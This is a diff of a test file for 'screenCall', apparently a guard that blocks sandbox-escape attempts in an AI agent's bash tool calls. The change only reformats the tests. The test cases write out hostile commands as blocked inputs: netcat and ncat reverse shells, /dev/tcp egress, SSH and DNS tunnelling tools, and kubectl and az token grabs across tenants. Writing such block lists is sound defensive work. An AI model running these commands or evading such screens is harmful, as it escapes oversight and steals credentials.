@@ -208,7 +208,12 @@ describe("screenCall", () => {
 
   test("egress evasion does not require a metadata target", () => {
     blockEscape("bash", { command: "ssh -D 1080" }, "egress-evasion", "ssh tunnel");
-    blockEscape("bash", { command: "ssh -L 8080:localhost:80 host" }, "egress-evasion", "ssh tunnel");
+    blockEscape(
+      "bash",
+      { command: "ssh -L 8080:localhost:80 host" },
+      "egress-evasion",
+      "ssh tunnel",
+    );
     blockEscape("bash", { command: "ssh -R 80:localhost:80 host" }, "egress-evasion", "ssh tunnel");
     blockEscape("bash", { command: "ssh -W host:22 jump" }, "egress-evasion", "ssh tunnel");
     blockEscape(
@@ -227,9 +232,19 @@ describe("screenCall", () => {
     blockEscape("bash", { command: "chisel server" }, "egress-evasion", "chisel");
     blockEscape("bash", { command: "iodine -f tun" }, "egress-evasion", "iodine");
     blockEscape("bash", { command: "dnscat2 --dns" }, "egress-evasion", "dnscat");
-    blockEscape("bash", { command: "proxychains curl https://example.com" }, "egress-evasion", "proxychains");
+    blockEscape(
+      "bash",
+      { command: "proxychains curl https://example.com" },
+      "egress-evasion",
+      "proxychains",
+    );
     blockEscape("bash", { command: "nc -e /bin/sh host 4444" }, "egress-evasion", "nc -e");
-    blockEscape("bash", { command: "ncat --exec /bin/sh host 4444" }, "egress-evasion", "ncat --exec");
+    blockEscape(
+      "bash",
+      { command: "ncat --exec /bin/sh host 4444" },
+      "egress-evasion",
+      "ncat --exec",
+    );
     blockEscape("bash", { command: "echo >/dev/tcp/1.2.3.4/80" }, "egress-evasion", "/dev/tcp/");
     blockEscape("bash", { command: "echo >/dev/udp/1.2.3.4/53" }, "egress-evasion", "/dev/udp/");
     blockEscape(
@@ -297,8 +312,18 @@ describe("screenCall", () => {
       "cross-tenant",
       "az account get-access-token --tenant",
     );
-    blockEscape("bash", { command: "kubectl create token default" }, "cross-tenant", "kubectl create token");
-    blockEscape("bash", { command: "kubectl --as=system:serviceaccount:x:y get pods" }, "cross-tenant", "kubectl --as=");
+    blockEscape(
+      "bash",
+      { command: "kubectl create token default" },
+      "cross-tenant",
+      "kubectl create token",
+    );
+    blockEscape(
+      "bash",
+      { command: "kubectl --as=system:serviceaccount:x:y get pods" },
+      "cross-tenant",
+      "kubectl --as=",
+    );
   });
 
   test("unparseable inspectable input is a block", () => {
